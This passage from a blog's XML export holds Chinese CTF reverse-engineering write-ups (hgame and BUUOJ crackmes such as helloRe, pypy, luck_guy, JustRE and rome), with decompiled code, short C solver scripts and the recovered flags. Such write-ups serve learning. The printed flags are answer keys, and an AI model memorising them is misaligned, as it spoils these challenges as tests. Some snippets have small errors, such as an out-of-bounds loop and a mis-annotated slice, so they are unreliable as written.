check[35]&#x3D;&#123;0x0E74EB323,0x0B7A72836,0x59CA6FE2,0x967CC5C1,0x0E7802674,0x3D2D54E6,</span><br><span class="line">0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD,0x0F496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,</span><br><span class="line">0x5270A5C2,0x0AC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0x0FB36DA2D,0x22179645,0x5CE3529D,</span><br><span class="line">0x0D189E1FB,0x0E85BD489,0x73C8D11F,0x54B5C196,0x0B67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,</span><br><span class="line">0x0A7E801FD,0x0C30D6EAB,0x1BADDC9C,0x3453B04A,0x92A406F9&#125;;</span><br><span class="line">int n&#x3D;35;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;35;i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%c&quot;,check[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;上述算法描述中，v表示为运算的长整型数据的首地址，k为长整型的密钥的首地址，n表示要要运算的组元个数，正表示加密，负表示解密。N是以32bit为基本单位的组元个数。</span><br></pre></td></tr></table></figure><blockquote><p>hgame{l00ks_1ike_y0u_f0Und_th3_t34}</p></blockquote><h1 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h1><p><a href="https://pan.baidu.com/s/1t1QacPyctI_WSWYYMA5_FQ">题目附件</a>提取码：ciyc<br>这道题就是异或与比较<br>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char memory[22];</span><br><span class="line">int a&#x3D;0x0FF;</span><br><span class="line">int b[22]&#x3D;&#123;0x97, 0x99, 0x9C, 0x91, 0x9E, 0x81, 0x91, 0x9D, 0x9B, 0x9A, 0x9A, 0xAB, 0x81, 0x97, 0xAE, 0x80, 0x83, 0x8F, 0x94, 0x89, 0x99, 0x97&#125;;</span><br><span class="line">for (int i &#x3D; 0; i &lt; 23; i++)</span><br><span class="line">&#123;</span><br><span class="line">memory[i]&#x3D;b[i]^a;</span><br><span class="line">a--;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;, memory);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&gt;hgame&#123;hello_re_player&#125;</span><br></pre></td></tr></table></figure><h1 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h1><p><a href="https://pan.baidu.com/s/11-_mbvb6tZezucy2DbU7CQ">题目附件</a>提取码：a5mm<br>python字节码，参考文档还原，好像有软件可以直接还原。<br><a href="https://docs.python.org/zh-cn/3.7/library/dis.html">文档链接</a><br>大致意思为：输入flag，去flag第六位至倒数第一位，flag[2i]与flag[2i+1]交换，<br>flag[i]^=i,最后输出的flag为30466633346f59213b4139794520572b45514d61583151576638643a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_GLOBAL              0 (input)</span><br><span class="line">              2 LOAD_CONST               1 (&#39;give me your flag:\n&#39;)</span><br><span class="line">              4 CALL_FUNCTION            1</span><br><span class="line">              6 STORE_FAST               0 (raw_flag)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_GLOBAL              1 (list)</span><br><span class="line">             10 LOAD_FAST                0 (raw_flag)</span><br><span class="line">             12 LOAD_CONST               2 (6)</span><br><span class="line">             14 LOAD_CONST               3 (-1)</span><br><span class="line">             16 BUILD_SLICE              2                  </span><br><span class="line">             18 BINARY_SUBSCR</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 STORE_FAST               1 (cipher)              cipher&#x3D;flag[6::-1]</span><br><span class="line"></span><br><span class="line">  6          24 LOAD_GLOBAL              2 (len)</span><br><span class="line">             26 LOAD_FAST                1 (cipher)</span><br><span class="line">             28 CALL_FUNCTION            1</span><br><span class="line">             30 STORE_FAST               2 (length)           length&#x3D;len(cipher)</span><br><span class="line"></span><br><span class="line">  8          32 LOAD_GLOBAL              3 (range)</span><br><span class="line">             34 LOAD_FAST                2 (length)</span><br><span class="line">             36 LOAD_CONST               4 (2)</span><br><span class="line">             38 BINARY_FLOOR_DIVIDE                              range(length&#x2F;2)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 GET_ITER</span><br><span class="line">        &gt;&gt;   44 FOR_ITER                54 (to 100)</span><br><span class="line">             46 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  9          48 LOAD_FAST                1 (cipher)</span><br><span class="line">             50 LOAD_CONST               4 (2)</span><br><span class="line">             52 LOAD_FAST                3 (i)</span><br><span class="line">             54 BINARY_MULTIPLY                                  2i</span><br><span class="line">             56 LOAD_CONST               5 (1)</span><br><span class="line">             58 BINARY_ADD                                       2i+1</span><br><span class="line">             60 BINARY_SUBSCR                                    cipher[2i+1]</span><br><span class="line">             62 LOAD_FAST                1 (cipher)</span><br><span class="line">             64 LOAD_CONST               4 (2)</span><br><span class="line">             66 LOAD_FAST                3 (i)</span><br><span class="line">             68 BINARY_MULTIPLY</span><br><span class="line">             70 BINARY_SUBSCR                                    cipher[2i]</span><br><span class="line">             72 ROT_TWO                                          cipher[2i]与cipher[2i+1]交换</span><br><span class="line">             74 LOAD_FAST                1 (cipher)</span><br><span class="line">             76 LOAD_CONST               4 (2)</span><br><span class="line">             78 LOAD_FAST                3 (i)</span><br><span class="line">             80 BINARY_MULTIPLY</span><br><span class="line">             82 STORE_SUBSCR</span><br><span class="line">             84 LOAD_FAST                1 (cipher)</span><br><span class="line">             86 LOAD_CONST               4 (2)</span><br><span class="line">             88 LOAD_FAST                3 (i)</span><br><span class="line">             90 BINARY_MULTIPLY</span><br><span class="line">             92 LOAD_CONST               5 (1)</span><br><span class="line">             94 BINARY_ADD</span><br><span class="line">             96 STORE_SUBSCR                                     新的cipher</span><br><span class="line">             98 JUMP_ABSOLUTE           44</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;  100 BUILD_LIST               0</span><br><span class="line">            102 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 13         104 LOAD_GLOBAL              3 (range)</span><br><span class="line">            106 LOAD_FAST                2 (length)</span><br><span class="line">            108 CALL_FUNCTION            1</span><br><span class="line">            110 GET_ITER                                         range(length)</span><br><span class="line">        &gt;&gt;  112 FOR_ITER                26 (to 140)</span><br><span class="line">            114 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line"> 14         116 LOAD_FAST                4 (res)</span><br><span class="line">            118 LOAD_METHOD              4 (append)</span><br><span class="line">            120 LOAD_GLOBAL              5 (ord)</span><br><span class="line">            122 LOAD_FAST                1 (cipher)</span><br><span class="line">            124 LOAD_FAST                3 (i)</span><br><span class="line">            126 BINARY_SUBSCR</span><br><span class="line">            128 CALL_FUNCTION            1</span><br><span class="line">            130 LOAD_FAST                3 (i)</span><br><span class="line">            132 BINARY_XOR                                       res&#x3D;ord(cipher[i])^i</span><br><span class="line">            134 CALL_METHOD              1</span><br><span class="line">            136 POP_TOP</span><br><span class="line">            138 JUMP_ABSOLUTE          112</span><br><span class="line"></span><br><span class="line"> 15     &gt;&gt;  140 LOAD_GLOBAL              6 (bytes)</span><br><span class="line">            142 LOAD_FAST                4 (res)</span><br><span class="line">            144 CALL_FUNCTION            1</span><br><span class="line">            146 LOAD_METHOD              7 (hex)</span><br><span class="line">            148 CALL_METHOD              0</span><br><span class="line">            150 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 16         152 LOAD_GLOBAL              8 (print)</span><br><span class="line">            154 LOAD_CONST               6 (&#39;your flag: &#39;)  </span><br><span class="line">            156 LOAD_FAST                4 (res)                 输出res(hex)</span><br><span class="line">            158 BINARY_ADD</span><br><span class="line">            160 CALL_FUNCTION            1</span><br><span class="line">            162 POP_TOP</span><br><span class="line">            164 LOAD_CONST               0 (None)</span><br><span class="line">            166 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int flag[28]&#x3D;&#123;0x30,0x46,0x66,0x33,0x34,0x6f,0x59,0x21,0x3b,0x41,0x39,0x79,0x45,0x20,0x57,0x2b,0x45,0x51,0x4d,0x61,0x58,0x31,0x51,0x57,0x66,0x38,0x64,0x3a&#125;;</span><br><span class="line">int i,a;</span><br><span class="line">for(i&#x3D;0;i&lt;28;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^&#x3D;i;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;14;i++)</span><br><span class="line">&#123;</span><br><span class="line">a&#x3D;flag[2*i];</span><br><span class="line">flag[2*i]&#x3D;flag[2*i+1];</span><br><span class="line">flag[2*i+1]&#x3D;a;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;28;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]luck_guy">题目链接</a><br>查看文件信息，是64位文件，拖进ida里，可以发现get_flag为flag的变换函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 get_flag()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; &#x2F;&#x2F; eax</span><br><span class="line">  char v1; &#x2F;&#x2F; al</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; &#x2F;&#x2F; [rsp+8h] [rbp-38h]</span><br><span class="line">  __int64 s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]</span><br><span class="line">  char v6; &#x2F;&#x2F; [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v0 &#x3D; time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( rand() % 200 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        puts(&quot;OK, it&#39;s flag:&quot;);</span><br><span class="line">        memset(&amp;s, 0, 0x28uLL);</span><br><span class="line">        strcat(&amp;s, f1);</span><br><span class="line">        strcat(&amp;s, &amp;f2);</span><br><span class="line">        printf(&quot;%s&quot;, &amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        printf(&quot;Solar not like you&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        printf(&quot;Solar want a girlfriend&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        v6 &#x3D; 0;</span><br><span class="line">        s &#x3D; 9180147350284624745LL;</span><br><span class="line">        strcat(&amp;f2, &amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        for ( j &#x3D; 0; j &lt;&#x3D; 7; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( j % 2 &#x3D;&#x3D; 1 )</span><br><span class="line">            v1 &#x3D; *(&amp;f2 + j) - 2;</span><br><span class="line">          else</span><br><span class="line">            v1 &#x3D; *(&amp;f2 + j) - 1;</span><br><span class="line">          *(&amp;f2 + j) &#x3D; v1;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;emmm,you can&#39;t find flag 23333&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是先运行case 4，然后case 5，最后case 1.<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a[8]&#x3D;&#123;0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f&#125;;</span><br><span class="line">int i,v1;</span><br><span class="line">for(i&#x3D;0;i&lt;8;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ( i % 2 &#x3D;&#x3D; 1 )</span><br><span class="line">            a[i] -&#x3D; 2;</span><br><span class="line">        else</span><br><span class="line">            a[i] -&#x3D; 1;</span><br><span class="line">        printf(&quot;%c&quot;,a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{do_not_hate_me}</p></blockquote><h1 id="JustRE"><a href="#JustRE" class="headerlink" title="JustRE"></a>JustRE</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF2020]JustRE">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span><br><span class="line">&#123;</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+0h] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  if ( a2 !&#x3D; 272 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 !&#x3D; 273 )</span><br><span class="line">      return 0;</span><br><span class="line">    if ( a3 !&#x3D; 1 &amp;&amp; a3 !&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sprintf(&amp;String, aD, ++dword_4099F0);</span><br><span class="line">      if ( dword_4099F0 &#x3D;&#x3D; 19999 )</span><br><span class="line">      &#123;</span><br><span class="line">        sprintf(&amp;String, aBjdDD2069a4579, 19999, 0);</span><br><span class="line">        SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    EndDialog(hWnd, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第14行，我把那两个数直接带进去，就对了。</p><blockquote><p>flag{1999902069a45792d233ac}</p></blockquote><h1 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]rome">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+14h] [ebp-44h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+18h] [ebp-40h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [esp+1Ch] [ebp-3Ch]</span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+20h] [ebp-38h]</span><br><span class="line">  unsigned __int8 v5; &#x2F;&#x2F; [esp+24h] [ebp-34h]</span><br><span class="line">  unsigned __int8 v6; &#x2F;&#x2F; [esp+25h] [ebp-33h]</span><br><span class="line">  unsigned __int8 v7; &#x2F;&#x2F; [esp+26h] [ebp-32h]</span><br><span class="line">  unsigned __int8 v8; &#x2F;&#x2F; [esp+27h] [ebp-31h]</span><br><span class="line">  unsigned __int8 v9; &#x2F;&#x2F; [esp+28h] [ebp-30h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+29h] [ebp-2Fh]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+2Dh] [ebp-2Bh]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+31h] [ebp-27h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+35h] [ebp-23h]</span><br><span class="line">  unsigned __int8 v14; &#x2F;&#x2F; [esp+39h] [ebp-1Fh]</span><br><span class="line">  char v15; &#x2F;&#x2F; [esp+3Bh] [ebp-1Dh]</span><br><span class="line">  char v16; &#x2F;&#x2F; [esp+3Ch] [ebp-1Ch]</span><br><span class="line">  char v17; &#x2F;&#x2F; [esp+3Dh] [ebp-1Bh]</span><br><span class="line">  char v18; &#x2F;&#x2F; [esp+3Eh] [ebp-1Ah]</span><br><span class="line">  char v19; &#x2F;&#x2F; [esp+3Fh] [ebp-19h]</span><br><span class="line">  char v20; &#x2F;&#x2F; [esp+40h] [ebp-18h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+41h] [ebp-17h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+42h] [ebp-16h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+43h] [ebp-15h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+44h] [ebp-14h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+45h] [ebp-13h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+46h] [ebp-12h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+47h] [ebp-11h]</span><br><span class="line">  char v28; &#x2F;&#x2F; [esp+48h] [ebp-10h]</span><br><span class="line">  char v29; &#x2F;&#x2F; [esp+49h] [ebp-Fh]</span><br><span class="line">  char v30; &#x2F;&#x2F; [esp+4Ah] [ebp-Eh]</span><br><span class="line">  char v31; &#x2F;&#x2F; [esp+4Bh] [ebp-Dh]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v15 &#x3D; 81;</span><br><span class="line">  v16 &#x3D; 115;</span><br><span class="line">  v17 &#x3D; 119;</span><br><span class="line">  v18 &#x3D; 51;</span><br><span class="line">  v19 &#x3D; 115;</span><br><span class="line">  v20 &#x3D; 106;</span><br><span class="line">  v21 &#x3D; 95;</span><br><span class="line">  v22 &#x3D; 108;</span><br><span class="line">  v23 &#x3D; 122;</span><br><span class="line">  v24 &#x3D; 52;</span><br><span class="line">  v25 &#x3D; 95;</span><br><span class="line">  v26 &#x3D; 85;</span><br><span class="line">  v27 &#x3D; 106;</span><br><span class="line">  v28 &#x3D; 119;</span><br><span class="line">  v29 &#x3D; 64;</span><br><span class="line">  v30 &#x3D; 108;</span><br><span class="line">  v31 &#x3D; 0;</span><br><span class="line">  printf(&quot;Please input:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;v5);</span><br><span class="line">  result &#x3D; v5;</span><br><span class="line">  if ( v5 &#x3D;&#x3D; &#39;A&#39; )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; v6;</span><br><span class="line">    if ( v6 &#x3D;&#x3D; &#39;C&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; v7;</span><br><span class="line">      if ( v7 &#x3D;&#x3D; &#39;T&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        result &#x3D; v8;</span><br><span class="line">        if ( v8 &#x3D;&#x3D; &#39;F&#39; )</span><br><span class="line">        &#123;</span><br><span class="line">          result &#x3D; v9;</span><br><span class="line">          if ( v9 &#x3D;&#x3D; &#39;&#123;&#39; )</span><br><span class="line">          &#123;</span><br><span class="line">            result &#x3D; v14;</span><br><span class="line">            if ( v14 &#x3D;&#x3D; &#39;&#125;&#39; )</span><br><span class="line">            &#123;</span><br><span class="line">              v1 &#x3D; v10;</span><br><span class="line">              v2 &#x3D; v11;</span><br><span class="line">              v3 &#x3D; v12;</span><br><span class="line">              v4 &#x3D; v13;</span><br><span class="line">              for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                if ( *(&amp;v1 + i) &gt; 64 &amp;&amp; *(&amp;v1 + i) &lt;&#x3D; 90 )</span><br><span class="line">                  *(&amp;v1 + i) &#x3D; (*(&amp;v1 + i) - 51) % 26 + 65;</span><br><span class="line">                if ( *(&amp;v1 + i) &gt; 96 &amp;&amp; *(&amp;v1 + i) &lt;&#x3D; 122 )</span><br><span class="line">                  *(&amp;v1 + i) &#x3D; (*(&amp;v1 + i) - 79) % 26 + 97;</span><br><span class="line">              &#125;</span><br><span class="line">              for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                result &#x3D; *(&amp;v15 + i);</span><br><span class="line">                if ( *(&amp;v1 + i) !&#x3D; result )</span><br><span class="line">                  return result;</span><br><span class="line">              &#125;</span><br><span class="line">              result &#x3D; printf(&quot;You are correct!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是你输入16个字符，经过变化和v15-v30比较，直接爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 